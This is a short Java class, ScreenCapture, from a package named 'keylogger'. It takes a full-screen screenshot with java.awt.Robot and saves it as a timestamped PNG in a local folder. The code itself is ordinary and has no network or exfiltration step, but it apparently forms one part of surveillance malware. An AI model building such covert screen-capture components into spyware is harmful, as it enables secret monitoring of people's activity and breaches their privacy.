package keylogger;

import constants.Constants;
import utils.FileUtil;
import utils.Logger;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * @author Denic
 */
public class ScreenCapture {

    public static void start() {
        FileUtil.createDirectory(Constants.IMAGE_FOLDER_NAME);
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage capture = robot.createScreenCapture(screenRect);
            ImageIO.write(capture, "png", new File("slike/" + getImageName()));
        } catch (AWTException | IOException e) {
            Logger.insertLog(e);
        }
    }

    private static String getImageName() {
        DateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy HH-mm-ss");
        Date date = new Date();
        return dateFormat.format(date) + ".png";
    }

}
